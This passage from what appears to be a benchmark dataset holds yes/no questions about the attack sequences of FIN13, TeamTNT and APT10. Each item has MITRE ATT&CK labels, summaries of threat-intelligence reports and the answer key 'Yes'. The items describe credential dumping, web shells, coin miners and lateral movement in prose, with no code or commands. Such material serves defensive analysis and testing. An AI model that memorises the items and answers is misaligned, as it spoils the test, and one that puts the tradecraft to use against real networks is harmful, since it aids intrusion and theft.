Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1887,337,337-Discovery-T1087-Account Discovery,"After gaining credentials via memory dumping LSASS and network sniffing, is FIN13 likely to leverage native OS binaries and scripts for gathering information on user accounts as part of their internal reconnaissance before using WMI for lateral movement across the victim network?","Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1888,337,337-Discovery-T1007-System Service Discovery,"After obtaining credentials via techniques like process memory dumping of LSASS and trojanized KeePass binaries, is it likely that FIN13 will gather information on services using system service discovery before moving laterally in the network using WMI and custom web shells?","Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1889,337,337-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,"After leveraging internal reconnaissance with native OS binaries and custom malware for discovery, is FIN13 likely to use tools such as ProcDump, Mimikatz, and certutil for privilege escalation before employing WMI and custom web shells like BUSTEDPIPE for lateral movement?","Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1890,337,337-Collection-T1039-Data from Network Shared Drive,"After leveraging WMI and custom tools like BUSTEDPIPE for lateral movement across networks, is it likely that FIN13 will collect sensitive data from network shared drives, stage it locally or remotely, and archive the collected data before targeting specific information to aid in fraudulent transactions?","Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1891,337,337-Collection-T1074-Data Staged,"After leveraging WMI to remotely execute commands and move laterally within victim networks, is FIN13 likely to collect data from network shared drives and then stage the data either locally or remotely for eventual fraudulent transactions?","Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1893,337,337-Exfiltration-T1567-Exfiltration Over Web Service,"After FIN13 transfers tools into the environment and encodes data for communication during their command and control phase, is it likely that they would exfiltrate data over web services by using web shells and JSP tools hosted in web-accessible directories?","Exfiltration: FIN13 exfiltrates data over web services, using tools like web shells and JSP tools in web-accessible directories to steal targeted data for fraudulent transactions.","Reconnaissance: Mandiant has been tracking FIN13, a cybercriminal threat actor targeting Mexico since 2017, with activities dating back to 2016. FIN13 is known for long-term intrusions, mapping victim networks, capturing credentials, and stealing various sensitive documents to facilitate fraudulent money transfers. Unlike typical ransomware groups, FIN13 uses custom passive backdoors and tools for extended periods within victim environments, focusing on financial, retail, and hospitality industries.
Initial Access: FIN13 has exploited external servers to deploy web shells and custom malware, including BLUEAGAVE and SIXPACK, to establish a foothold. Specific vulnerabilities targeted are unclear due to long dwell times and insufficient evidence. However, web shells on external servers have been a consistent gateway for FIN13 into victim networks.
Execution: FIN13 employs JSPRAT for local command execution, file upload/download, and network traffic proxying. They also use passive backdoors like BLUEAGAVE, which establishes a local HTTP server on high ephemeral ports, listening for incoming HTTP requests and executing commands via cmd.exe.
Persistence: FIN13 uses various methods for persistence, including replacing legitimate KeePass binaries with trojanized versions to log passwords, and deploying malware like SIXPACK and SWEARJAR. They also use email communications for command and control with a backdoor called MAILSLOT.
Privilege Escalation: FIN13 utilizes common privilege escalation techniques, adapting to diverse victim networks. They have used utilities like ProcDump to dump LSASS process memory and Mimikatz to extract credentials. Additionally, they have employed certutil to launch obfuscated utilities and trojanized KeePass binaries for credential harvesting.
Defense Evasion: FIN13 employs defense evasion tactics such as using passive backdoors for stealth, chaining web shells for complex pivots, and leveraging legitimate utilities like certutil for detection evasion. They also use custom droppers like LATCHKEY and malware like DRAWSTRING with recon functionality.
Credential Access: FIN13 uses techniques like process memory dumping of LSASS and network sniffing to obtain credentials. They also target unsecured credentials and have used trojanized versions of KeePass to log newly entered passwords.
Discovery: FIN13 leverages native OS binaries, scripts, third-party tools, and custom malware for internal reconnaissance. They gather information on network and host configurations, user accounts, and services to support their objectives.
Lateral Movement: The group uses WMI to remotely execute commands and move laterally, employing utilities like Invoke-WMIExec and custom web shells like BUSTEDPIPE. They also use Invoke-SMBExec and NIGHTJAR for lateral movement and cross-platform operations.
Collection: FIN13 collects data from network shared drives and stages it locally or remotely. They also archive collected data using utilities and libraries, targeting specific data that aids in fraudulent transactions.
Command and Control: FIN13 uses proxies, application layer protocols, and non-application layer protocols for command and control. They also transfer tools into the environment and encode data for communication.
Others: FIN13's operations are characterized by a median dwell time of 913 days, which is significantly longer than typical financially motivated actors. They have a rare operational lifespan of over five years, targeting only organizations in Mexico. FIN13's endgame involves processing POS data and sending fraudulent ISO 8583 transactions. Despite the rise of ransomware, FIN13 has not deployed ransomware and remains focused on traditional cybercrime.",Yes,FIN13_ A Cybercriminal Threat Actor Focused on Mexico _ Mandiant
1894,338,338-Initial Access-T1190-Exploit Public-Facing Application,"After scanning for open Docker API endpoints using the masscan tool during reconnaissance, is it likely that TeamTNT will gain initial access to Kubernetes clusters via exposed Weave Scope services before executing the coin miner payload saved as /usr/sbin/docker-update?","Initial Access: TeamTNT has been known to spread their malware via exposed Docker API servers. The new access vector discovered involves the use of an open Weave Scope service, which is a visualization and monitoring framework for containerized environments. Weave Scope, when exposed to the Internet without authentication, allows attackers to run shell on the pods or nodes in the cluster, leading to compromise.","Reconnaissance: The cybercrime group TeamTNT has been observed using a new image, pause-amd64:3.4, to conduct reconnaissance and spread malware. This image is deployed on Kubernetes clusters and uses a shell script as its entry point, which downloads a coin miner from a server located in Germany. The script then scans for open Docker API endpoints using the masscan tool and deploys the same image on exposed endpoints. Additionally, the script attempts to kill competitor images using docker rm commands.
Execution: The main payload, a coin miner, is executed after being downloaded and saved on the host as /usr/sbin/docker-update. The attributes of the miner are changed to immutable, and it is executed to perform cryptocurrency mining.
Discovery: TeamTNT's script performs discovery by scanning IP ranges for open Docker API endpoints and deploys the malware to other machines. The script also uses a service called iplogger.org to track the number of infected hosts and obtain their details.
Others: Azure Security Center (ASC) detects the attack by monitoring the behavior of the AKS management layer and the containers themselves. ASC provides protection at both the management layer, by detecting exposed sensitive services like Weave Scope, and at the node level, by detecting openly accessible Docker API services and malicious behavior such as cryptocurrency mining activity. Recommendations include using Azure Policy for Kubernetes to restrict and audit sensitive actions and deploying images from trusted registries only.",Yes,TeamTNT activity targets Weave Scope deployments - Microsoft Tech Community - 1645968
1895,338,338-Execution-T1059-Command and Scripting Interpreter,"After performing reconnaissance by scanning for open Docker API endpoints and killing competitor images using docker rm commands, is TeamTNT likely to gain initial access to the victim's environment by exploiting an exposed Weave Scope service before executing a coin miner by downloading it as /usr/sbin/docker-update and running it for cryptocurrency mining?","Execution: The main payload, a coin miner, is executed after being downloaded and saved on the host as /usr/sbin/docker-update. The attributes of the miner are changed to immutable, and it is executed to perform cryptocurrency mining.","Reconnaissance: The cybercrime group TeamTNT has been observed using a new image, pause-amd64:3.4, to conduct reconnaissance and spread malware. This image is deployed on Kubernetes clusters and uses a shell script as its entry point, which downloads a coin miner from a server located in Germany. The script then scans for open Docker API endpoints using the masscan tool and deploys the same image on exposed endpoints. Additionally, the script attempts to kill competitor images using docker rm commands.
Initial Access: TeamTNT has been known to spread their malware via exposed Docker API servers. The new access vector discovered involves the use of an open Weave Scope service, which is a visualization and monitoring framework for containerized environments. Weave Scope, when exposed to the Internet without authentication, allows attackers to run shell on the pods or nodes in the cluster, leading to compromise.
Discovery: TeamTNT's script performs discovery by scanning IP ranges for open Docker API endpoints and deploys the malware to other machines. The script also uses a service called iplogger.org to track the number of infected hosts and obtain their details.
Others: Azure Security Center (ASC) detects the attack by monitoring the behavior of the AKS management layer and the containers themselves. ASC provides protection at both the management layer, by detecting exposed sensitive services like Weave Scope, and at the node level, by detecting openly accessible Docker API services and malicious behavior such as cryptocurrency mining activity. Recommendations include using Azure Policy for Kubernetes to restrict and audit sensitive actions and deploying images from trusted registries only.",Yes,TeamTNT activity targets Weave Scope deployments - Microsoft Tech Community - 1645968
1896,338,338-Reconnaissance-T1595-Active Scanning,"After leveraging an open Weave Scope service to achieve initial access to a Kubernetes cluster, is TeamTNT likely to execute a downloaded coin miner by setting its attributes to immutable and performing cryptocurrency mining, followed by scanning IP ranges to identify additional open Docker API endpoints for malware deployment?","Reconnaissance: The cybercrime group TeamTNT has been observed using a new image, pause-amd64:3.4, to conduct reconnaissance and spread malware. This image is deployed on Kubernetes clusters and uses a shell script as its entry point, which downloads a coin miner from a server located in Germany. The script then scans for open Docker API endpoints using the masscan tool and deploys the same image on exposed endpoints. Additionally, the script attempts to kill competitor images using docker rm commands.","Initial Access: TeamTNT has been known to spread their malware via exposed Docker API servers. The new access vector discovered involves the use of an open Weave Scope service, which is a visualization and monitoring framework for containerized environments. Weave Scope, when exposed to the Internet without authentication, allows attackers to run shell on the pods or nodes in the cluster, leading to compromise.
Execution: The main payload, a coin miner, is executed after being downloaded and saved on the host as /usr/sbin/docker-update. The attributes of the miner are changed to immutable, and it is executed to perform cryptocurrency mining.
Discovery: TeamTNT's script performs discovery by scanning IP ranges for open Docker API endpoints and deploys the malware to other machines. The script also uses a service called iplogger.org to track the number of infected hosts and obtain their details.
Others: Azure Security Center (ASC) detects the attack by monitoring the behavior of the AKS management layer and the containers themselves. ASC provides protection at both the management layer, by detecting exposed sensitive services like Weave Scope, and at the node level, by detecting openly accessible Docker API services and malicious behavior such as cryptocurrency mining activity. Recommendations include using Azure Policy for Kubernetes to restrict and audit sensitive actions and deploying images from trusted registries only.",Yes,TeamTNT activity targets Weave Scope deployments - Microsoft Tech Community - 1645968
1911,34,34-Credential Access-T1003-OS Credential Dumping,"After utilizing compromised MSP credentials to gain higher-level permissions such as domain administrator during privilege escalation, is it likely that APT10 will deploy tools such as mimikatz or PwDump for OS credential dumping by using DLL load order hijacking against a domain controller?","Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.","Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.
Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.
Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.
Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",Yes,cloud-hopper-report-final-v4
1912,34,34-Discovery-T1018-Remote System Discovery,"After initially sending spear phishing emails with malicious attachments or links to gain initial access, is APT10 likely to conduct internal reconnaissance to map out the network before leveraging shared MSP infrastructure for lateral movement between MSPs and other victims?",Discovery: APT10 conducts internal reconnaissance to map out the network using common Windows tools and later stages using open-source pentesting tools.,"Initial Access: APT10, a China-based threat actor, has been observed using spear phishing emails with malicious attachments or links to compromise targets. These emails often contain decoy documents relevant to the recipient's interests, indicating significant target research. For example, an official document from the Japan Society for the Promotion of Science was weaponized and used in a campaign against the Japanese education sector.
Execution: APT10 deploys malware to establish a foothold on a target network, using tools like PlugX, RedLeaves, or Quasar RAT for long-term remote access. The actor performs internal reconnaissance using common Windows tools and open-source pentesting tools. APT10 ensures access to legitimate credentials, often using the MSPs credentials, and deploys credential theft tools such as mimikatz or PwDump. The actor installs updates and new malware on compromised systems, using methods like reverse shell or RDP connections to propagate across the network.
Persistence: APT10 achieves persistence on victim networks primarily through scheduled tasks or Windows services, ensuring malware remains active despite system reboots. The actor targets both high-value systems for access and low-profile systems less likely to draw attention for long-term access.
Privilege Escalation: APT10 uses credential theft tools to gain higher-level permissions on compromised systems. The actor has been observed using stolen MSP credentials to gain administrator or domain administrator privileges.
Defense Evasion: APT10 has evolved from using malware associated with China-based threat actors to developing bespoke in-house malware like ChChes and RedLeaves. The actor also uses open-source malware like Quasar and extends its capabilities. APT10 uses DLL search order hijacking and sideloading to execute modified versions of open-source tools.
Credential Access: APT10 deploys tools like mimikatz or PwDump to steal credentials, often using DLL load order hijacking to execute against a domain controller.
Lateral Movement: APT10 leverages shared MSP infrastructure to move laterally between MSPs and other victims. The actor uses systems that share access and credentials to gain access to new areas of the network.
Collection: APT10 identifies systems of interest and stages data for exfiltration in multi-part archives, often placed in the Recycle Bin, using compression tools launched via remote command execution scripts.
Command and Control: APT10 uses dynamic-DNS domains for command and control infrastructure, which are highly interconnected and link back to the actor's previous operations. The actor uses legitimate Robocopy tool and Putty Secure Copy Client (PSCP) to transfer data for command and control.
Exfiltration: APT10 'pushes' data from victim networks to other networks they have access to, such as other MSP or victim networks, then 'pulls' the data to locations from which they can directly obtain it, such as the threat actor's C2 servers.
Others: APT10, a China-based threat actor, has been active since at least 2009, evolving its targeting from the US defense industrial base and technology sectors to a global compromise of multiple industries. The actor has increased its scale and capability since early 2016, adding new custom tools and significantly increasing the number of dynamic-DNS domains used for operations. APT10's activities align with China Standard Time and its targeting corresponds with strategic Chinese interests. The actor's campaigns, including Operation Cloud Hopper, have targeted managed IT service providers (MSPs) and Japanese organizations, focusing on espionage and sensitive data collection. APT10's methodology includes spear phishing, use of bespoke and open-source malware, and leveraging MSP infrastructure for lateral movement and data exfiltration.",Yes,cloud-hopper-report-final-v4
